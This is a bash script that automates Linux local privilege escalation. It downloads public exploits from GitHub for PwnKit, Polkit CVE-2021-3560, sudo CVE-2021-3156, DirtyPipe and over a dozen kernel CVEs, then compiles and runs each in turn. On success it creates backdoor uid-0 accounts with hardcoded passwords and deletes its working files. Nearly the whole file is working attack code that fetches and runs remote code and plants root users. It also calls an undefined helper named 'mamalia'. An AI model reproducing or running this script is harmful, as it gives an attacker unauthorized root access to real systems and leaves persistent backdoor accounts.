#!/bin/bash

function Pwnkit32() {
    wget -q https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit32
    mv PwnKit32 polkadot
    curl -fsSLk https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit32 -o polkadot
    chmod +x polkadot
    result="$(./polkadot 'useradd -m -d /root -ou 0 -g 0 -p "$(openssl passwd -1 Polkadot1337)" sysdata')"
    echo "$result"
}

function Pwnkit() {
    wget -q https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
    mv PwnKit polkadot
    curl -fsSLk https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o polkadot
    chmod +x polkadot
    result="$(./polkadot 'useradd -m -d /root -ou 0 -g 0 -p "$(openssl passwd -1 Polkadot1337)" sysdata')"
    echo "$result"
}

function Polkit() {
    rm -rf polkit.sh
    wget -q https://raw.githubusercontent.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/main/poc.sh
    mv poc.sh polkit.sh
    curl --silent -fsSL --insecure https://raw.githubusercontent.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/main/poc.sh -o polkit.sh

    if [ -e "$(pwd)/polkit.sh" ]; then
        chmod +x polkit.sh
        result="$(./polkit.sh -u=polkadot -p=Polkadot1337 -t=.005 -f=y)"
    else
        echo "[CVE-2021-3560] Change directory..."
        rm -rf polkit.sh
    fi
}

function userSpec() {
    wget -q https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_userspec.py
    mv exploit_userspec.py polkadot.py
    curl -fsk https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_userspec.py -o polkadot.py
    $(which python3.8) polkadot.py
    output=$(cat /etc/passwd)

    if [[ $output == *"gg:/root"* ]]; then
        echo "[CVE-2021-3156] Vuln rooted!"
    else
        echo "[CVE-2021-3156] Not vuln!"
        rm -rf polkadot.py
    fi
}

function dirtyc() {
    wget -q https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c
    curl -fsk https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c -o exploit-1.c
    gcc exploit-1.c -o exploit-1 2>/dev/null
    rm -rf exploit-1.c
    chmod +x exploit-1
    show_output=$(./exploit-1)

    if [ -e "/tmp/sh" ]; then
        echo "[INFO] Comments: "
        echo "$show_output"
        echo "[CVE-2022-0847] Detected Vuln!"
        echo "[CVE-2022-0847] USER: root"
        echo "[CVE-2022-0847] PASSWD: piped"
    else
        echo "[INFO] Comments: "
        echo "$show_output"
        rm -rf exploit-1
    fi
}

function dirtyc2() {
    wget -q https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c
    curl -fsk https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c -o exploit-2.c
    gcc exploit-2.c -o exploit-2 2>/dev/null
    rm -rf exploit-2.c
    chmod +x exploit-2
    show_output=$(./exploit-2)

    if [ -e "/tmp/sh" ]; then
        echo "[INFO] Comments: "
        echo "$show_output"
        echo "[CVE-2022-0847] Detected Vuln!"
        echo "[CVE-2022-0847] USER: root"
        echo "[CVE-2022-0847] PASSWD: piped"
    else
        echo "[INFO] Comments: "
        echo "$show_output"
        rm -rf exploit-1
    fi
}

function permissionKernel() {
    echo "Checking requirements..."
    echo "Available commands: $(which gcc) $(which python) $(which python3) $(which perl) $(which ruby) 2>/dev/null"

    os="$(cat /etc/lsb-release /etc/os-release 2>/dev/null)"
    kernel="$(uname -r)"

    if [[ $os == *"ubuntu"* || $os == *"Ubuntu"* ]]; then
        echo "Kernel version $kernel"
        echo "Detected Ubuntu Operating System"
    elif [[ $os == *"CentOS"* || $os == *"RHEL"* || $os == *"centos"* ]]; then
        echo "Kernel version $kernel"
        echo "Detected CentOS Operating System"
    fi
}

function checkGCC() {
    result="$(which gcc python python3 perl ruby 2>/dev/null)"
    echo "$result"
}

function cleanup() {
    rm -rf *.c *.py *.c* *.pyc polkadot*
}

function showMsg() {
    echo "CVE: $1"
    echo "Source: $2"
}

function compileExploits() {
    src="$1"

    if [[ $src == *"main/CVE-2022-2586.c"* ]]; then
        wget --quiet "$src"
        /bin/sh -c 'gcc CVE-2022-2586.c -o polkadot2586 -lmnl -lnftnl -no-pie -lpthread 2>/dev/null'
        
        if [ -e "polkadot2586" ]; then
            chmod +x polkadot2586
            echo 'polkadot2586'
        fi
    fi

    if [[ $src == *"CVE-2016-0728/cve-2016-0728.c"* ]]; then
        wget --quiet "$src"
        /bin/sh -c 'gcc cve-2016-0728.c -o polkadot0728 -lkeyutils -Wall 2>/dev/null'

        if [ -e "polkadot0728" ]; then
            chmod +x polkadot0728
            echo 'polkadot0728 PP1'
        fi
    fi

    if [[ $src == *"CVE-2013-0268/27297.c"* ]]; then
        wget --quiet "$src"
        /bin/sh -c 'gcc 27297.c -o polkadot7297 2>/dev/null'
        if [ -e "polkadot7297" ]; then
            chmod +x polkadot7297
            echo 'polkadot7297'
        fi
    fi

    if [[ $src == *"CVE-2014-0038/CVE-2014-0038.c"* ]]; then
        wget --quiet "$src"
        /bin/sh -c 'gcc CVE-2014-0038.c -o polkadot0038 2>/dev/null'
        if [ -e "polkadot0038" ]; then
            chmod +x polkadot0038
            echo 'polkadot0038'
        fi
    fi

    if [[ $src == *"CVE-2014-0196/cve-2014-0196.c"* ]]; then
        wget --quiet "$src"
        /bin/sh -c 'gcc cve-2014-0196.c -lutil -lpthread 2>/dev/null'
        if [ -e "a.out" ]; then
            mv a.out polkadot0196
            chmod +x polkadot0196
            echo 'polkadot0196'
        fi
    fi

    if [[ $src == *"CVE-2014-4014/33824.c"* ]]; then
        wget --quiet "$src"
        /bin/sh -c 'gcc 33824.c -o polkadot33824 2>/dev/null'
        if [ -e "polkadot33824" ]; then
            chmod +x polkadot33824
            echo 'polkadot33824'
        fi
    fi

    if [[ $src == *"CVE-2015-1328/37292.c"* ]]; then
        wget --quiet "$src"
        /bin/sh -c 'gcc 37292.c -o polkadot37292 2>/dev/null'
        if [ -e "polkadot37292" ]; then
            chmod +x polkadot37292
            echo 'polkadot37292'
        fi
    fi

    if [[ $src == *"CVE-2016-9793/poc.c"* ]]; then
        wget --quiet "$src"
        /bin/sh -c 'gcc poc.c -o polkadot9793 2>/dev/null'
        if [ -e "polkadot9793" ]; then
            chmod +x polkadot9793
            echo 'polkadot9793'
        fi
    fi

    if [[ $src == *"CVE-2019-15666/exp.c"* ]]; then
        wget --quiet "$src"
        /bin/sh -c 'gcc -static -pthread ./exp.c -o ./polkadot15666 2>/dev/null'
        if [ -e "polkadot15666" ]; then
            chmod +x polkadot15666
            echo 'polkadot15666'
        fi
    fi

    if [[ $src == *"CVE-2019-13272/CVE-2019-13272.c"* ]]; then
        wget --quiet "$src"
        /bin/sh -c 'gcc -s CVE-2019-13272.c -o polkadot13272 2>/dev/null'
        if [ -e "polkadot13272" ]; then
            chmod +x polkadot13272
            echo 'polkadot13272'
        fi
    fi

    if [[ $src == *"main/PwnKit.c"* ]]; then
        wget --quiet "$src"
        /bin/sh -c 'gcc -shared PwnKit.c -o DotPwnKit -Wl,-e,entry -fPIC 2>/dev/null'
        if [ -e "DotPwnKit" ]; then
            chmod +x DotPwnKit
            echo 'DotPwnKit'
        fi
    fi

    if [[ $src == *"CVE-2021-3493/main/exploit.c"* ]]; then
        wget --quiet "$src"
        /bin/sh -c 'gcc exploit.c -o polkadot3493 2>/dev/null'
        if [ -e "polkadot3493" ]; then
            chmod +x polkadot3493
            echo 'polkadot3493'
        fi
    fi

    if [[ $src == *"CVE-2022-32250-exploit/main/exp.c"* ]]; then
        wget --quiet "$src"
        /bin/sh -c 'gcc exp.c -o polkadot32250x -l mnl -l nftnl -w 2>/dev/null'
        if [ -e "polkadot32250x" ]; then
            chmod +x polkadot32250x
            echo 'polkadot32250x'
        fi
    fi

    if [[ $src == *"CVE-2015-8550/exp.c"* ]]; then
        wget --quiet "$src"
        /bin/sh -c 'gcc exp.c -o polkadot8550 2>/dev/null'
        if [ -e "polkadot8550" ]; then
            chmod +x polkadot8550
            echo 'polkadot8550'
        fi
    fi

    if [[ $src == *"CVE-2017-5123/exploit_smap_bypass.c"* ]]; then
        wget --quiet "$src"
        /bin/sh -c 'gcc exploit_smap_bypass.c -lpthread -o polkadot43029 2>/dev/null'
        if [ -e "polkadot43029" ]; then
            chmod +x polkadot43029
            echo 'polkadot43029'
        fi
    fi

    if [[ $src == *"CVE-2021-22555/exploit.c"* ]]; then
        wget --quiet "$src"
        /bin/sh -c 'gcc -m32 -static -o polkadot22555 exploit.c 2>/dev/null'
        if [ -e "polkadot22555" ]; then
            chmod +x polkadot22555
            echo 'polkadot22555'
        fi
    fi

    if [[ $src == *"CVE-2017-16995/upstream44.c"* ]]; then
        wget --quiet "$src"
        /bin/sh -c 'gcc -o polkadot16995 upstream44.c 2>/dev/null'
        if [ -e "polkadot16995" ]; then
            chmod +x polkadot16995
            echo 'polkadot16995'
        fi
    fi

    if [[ $src == *"CVE-2022-32250-exploit/main/exp.c"* ]]; then
        wget --quiet "$src"
        /bin/sh -c 'gcc exp.c -o polkadot32250x4 -l mnl -l nftnl -w 2>/dev/null'
        if [ -e "polkadot32250x4" ]; then
            chmod +x polkadot32250x4
            echo 'polkadot32250x4'
        fi
    fi
}

function runExploit() {
    name="$1"
    
    if [[ $name == *"DotPwnKit"* ]]; then
        result="./$name 'id' 2>/dev/null"
    elif [[ $name == *"polkadot15666"* ]]; then
        result="./$name & timeout 5s sleep 30 ;  kill $!"
    else
        result="./$name 2>/dev/null"
    fi

    result_output="$("$result")"
    echo "[$name] Comments:"
    echo "$result_output"

    if [[ $result_output == *"Operation not permitted"* ]]; then
        cleanup
        echo "[$name] Not vuln!"
    elif [[ $result_output == *"get_root done"* || $result_output == *"Attached to midpid"* || $result_output == *"uid=0(root)"* ]]; then
        echo "[$name] Detected Vuln!"
        exit
    else
        cleanup
        echo "[$name] Not vuln!"
    fi
}

function Exploits() {
    declare -A list_exploit=(
        ["CVE-2022-32250-Linux-Kernel-LPE"]="https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c"
        ["CAP_SYS_ADMIN Local Privilege Escalation (dbus Method)"]="https://raw.githubusercontent.com/Al1ex/LinuxEelvation/master/CVE-2015-8550/exp.c"
        ["CAP_NET_ADMIN -> root LPE exploit for CVE-2016-9793"]="https://raw.githubusercontent.com/Al1ex/LinuxEelvation/master/CVE-2016-9793/poc.c"
        ["Kernel 4.14.0-rc4+"]="https://raw.githubusercontent.com/salls/kernel-exploits/master/CVE-2017-5123/exploit_smap_bypass.c"
        ["Ubuntu 16.04.4 kernel priv esc"]="https://raw.githubusercontent.com/Al1ex/LinuxEelvation/master/CVE-2017-16995/upstream44.c"
        ["ofs.c - overlayfs local root in ubuntu"]="https://raw.githubusercontent.com/Al1ex/LinuxEelvation/master/CVE-2015-1328/37292.c"
        ["linux 3.4+ local root (CONFIG_X86_X32=y)"]="https://raw.githubusercontent.com/Al1ex/LinuxEelvation/master/CVE-2014-0038/CVE-2014-0038.c"
        ["Linux kernel <= v3.15-rc4: raw mode PTY local echo race"]="https://raw.githubusercontent.com/Al1ex/LinuxEelvation/master/CVE-2014-0196/cve-2014-0196.c"
        ["CVE-2014-4014 Linux Kernel Local Privilege Escalation"]="https://raw.githubusercontent.com/Al1ex/LinuxEelvation/master/CVE-2014-4014/33824.c"
        ["Linux ubuntu /etc/sudoers"]="https://raw.githubusercontent.com/Al1ex/LinuxEelvation/master/CVE-2019-15666/exp.c"
        ["Linux 4.10 < 5.1.17 PTRACE_TRACEME local root"]="https://raw.githubusercontent.com/Al1ex/LinuxEelvation/master/CVE-2019-13272/CVE-2019-13272.c"
        ["Ubuntu OverlayFS Local Privesc"]="https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c"
        ["Self-contained exploit for CVE-2021-4034 - Pkexec Local Privilege Escalation"]="https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c"
        ["CVE-2021-22555: Turning \x00\x00 into 10000$"]="https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c"
        ["Mempodipper - Linux Local Root for >=2.6.39, 32-bit and 64-bit"]="https://raw.githubusercontent.com/Al1ex/LinuxEelvation/master/CVE-2012-0056/18411.c"
        ["Access Restriction Bypass - CVE-2013-0268"]="https://raw.githubusercontent.com/Al1ex/LinuxEelvation/master/CVE-2013-0268/27297.c"
        ["Linux kernel nft_object UAF - CVE-2022-2586"]="https://raw.githubusercontent.com/aels/CVE-2022-2586-LPE/main/CVE-2022-2586.c"
    )

    for name in "${!list_exploit[@]}"; do
        showMsg "$name" "${list_exploit[$name]}"
        exploit_name="$(compileExploits "${list_exploit[$name]}")"
        runExploit "$exploit_name"
    done
}

function easeDetect() {
    ease_detect="$(mamalia 'temp=$(cat /etc/passwd); echo $temp')"
    
    if [[ $ease_detect == *"sysdata"* ]]; then
        echo "[PWNKIT] Detected Vuln!"
        echo "[PWNKIT] USER: sysdata"
        echo "[PWNKIT] PASSWD: Polkadot1337"
        cleanup
        exit
    elif [[ $ease_detect == *"polkadot"* ]]; then
        echo "[CVE-2021-3560] Detected Vuln!"
        echo "[CVE-2021-3560] USER: polkadot"
        echo "[CVE-2021-3560] PASSWD: Polkadot1337"
        cleanup
        exit
    elif [[ $ease_detect == *"gg:/root"* ]]; then
        echo "[CVE-2021-3156] Detected Vuln!"
        echo "[CVE-2021-3156] USER: gg"
        echo "[CVE-2021-3156] PASSWD: gg"
        cleanup
        exit
    fi
}

function main() {
    permissionKernel
    status="$(checkGCC)"
    easeDetect

    if [[ $status == *"/bin/gcc"* || $status == *"gcc"* ]]; then
        echo "[INFO] GCC Found, Trying all exploit privilege escalation..."
        echo "[INFO] Running PwnKit32 exploit..."
        show_output="$(Pwnkit32)"
        detect="$(temp=$(cat /etc/passwd); echo $temp)"
        
        if [[ $detect == *"sysdata"* ]]; then
            echo "[PWNKIT32] Detected Vuln!"
            echo "[PWNKIT32] USER: sysdata"
            echo "[PWNKIT32] PASSWD: Polkadot1337"
            echo "[INFO] Comments:"
            echo "$show_output"
            cleanup
            
            exit
        else
            echo "[INFO] Not Vuln!"
            echo "[INFO] Comments:"
            echo "$show_output"
            cleanup
        fi

        echo "[INFO] Running PwnKit exploit..."
        show_output="$(Pwnkit)"
        detect="$(temp=$(cat /etc/passwd); echo $temp)"
        
        if [[ $detect == *"sysdata"* ]]; then
            echo "[PWNKIT] Detected Vuln!"
            echo "[PWNKIT] USER: sysdata"
            echo "[PWNKIT] PASSWD: Polkadot1337"
            echo "[INFO] Comments:"
            echo "$show_output"
            cleanup
            
            exit
        else
            echo "[INFO] Not Vuln!"
            echo "[INFO] Comments:"
            echo "$show_output"
            cleanup
        fi

        echo "[INFO] Running Polkit exploit..."
        show_output="$(Polkit)"
        detect="$(temp=$(cat /etc/passwd); echo $temp)"
        
        if [[ $detect == *"polkadot"* ]]; then
            echo "[CVE-2021-3560] Detected Vuln!"
            echo "[CVE-2021-3560] USER: polkadot"
            echo "[CVE-2021-3560] PASSWD: Polkadot1337"
            echo "[INFO] Comments:"
            echo "$show_output"
            cleanup
            
            exit
        else
            echo "[INFO] Not Vuln!"
            echo "[INFO] Comments:"
            echo "$show_output"
            cleanup
        fi

        echo "[INFO] Running SUDOEDIT exploit..."
        show_output="$(userSpec)"
        detect="$(temp=$(cat /etc/passwd); echo $temp)"
        
        if [[ $detect == *"gg:/root"* ]]; then
            echo "[CVE-2021-3156] Detected Vuln!"
            echo "[CVE-2021-3156] USER: gg"
            echo "[CVE-2021-3156] PASSWD: gg"
            echo "[INFO] Comments:"
            echo "$show_output"
            cleanup
            
            exit
        else
            echo "[INFO] Not Vuln!"
            echo "[INFO] Comments:"
            echo "$show_output"
            cleanup
        fi

        echo "[INFO] Running DirtyC exploit..."
        out="$(dirtyc)"

        if [[ $out == *"Detected Vuln"* ]]; then
            exit
        else
            echo "[INFO] Not Vuln!"
            cleanup
        fi

        echo "[INFO] Running DirtyC2 exploit..."
        out="$(dirtyc2)"

        if [[ $out == *"Detected Vuln"* ]]; then
            exit
        else
            echo "[INFO] Not Vuln!"
            cleanup
        fi

        Exploits

        mamalia "rm -rf *.c *.py *.c* *.pyc polkadot* *pkexec GCONV* DotPwnKit"
        echo "[FINISH] All exploit has been tested!"
        echo "[FINISH] Happy result :)"
    else
        echo "[INFO] Cannot run exploit because GCC is not found!"
    fi
}

# Call the main function
main
